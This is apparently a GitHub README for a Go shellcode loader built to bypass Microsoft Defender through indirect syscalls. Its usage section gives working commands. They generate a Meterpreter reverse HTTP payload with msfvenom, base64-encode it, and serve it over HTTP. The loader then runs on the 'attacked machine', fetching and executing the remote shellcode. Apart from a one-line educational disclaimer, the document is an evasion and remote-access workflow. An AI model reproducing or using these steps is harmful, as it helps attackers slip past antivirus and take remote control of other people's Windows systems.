# Overview
A simple golang loader that bypass Defender
It uses [acheron](https://github.com/f1zm0/acheron) to make some indirect syscalls.
> I am currently working on improving this project and enhancing my skills in offensive Go. Any feedback is welcome!

### Usage

Generate the shellcode to execute, I usually use Havoc but it works with anyone:

```bash
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=YOUR_IP LPORT=8080 -f raw -o shellcode.bin
base64 -w0 shellcode.bin > shellcode.enc
```
or using Havoc C2:
![Havoc Shellcode Generator](https://i.imgur.com/iaNxbKi.png)
```bash
base64 -w0 shellcode.bin > shellcode.enc
```

There are several ways to create HTTP servers, I will use this one in the directory with the shellcode.enc:
```bash
python3 -m http.server 80
```
From the attacked machine run the following command:
```powershell
.\loader.exe -url http://<YOUR_IP>/shellcode.enc
```
![Shellcode Executed](https://i.imgur.com/XeUIL6C.png)
![msfvenom shellcode executed](https://i.imgur.com/2LMnHgQ.png)
![Havoc console](blob:https://imgur.com/27129cb0-0d73-4280-99ef-a4a1bde93e30)


[!WARNING]
This project is for educational purposes only. Do not run it on machines you do not own or have explicit permission to test.

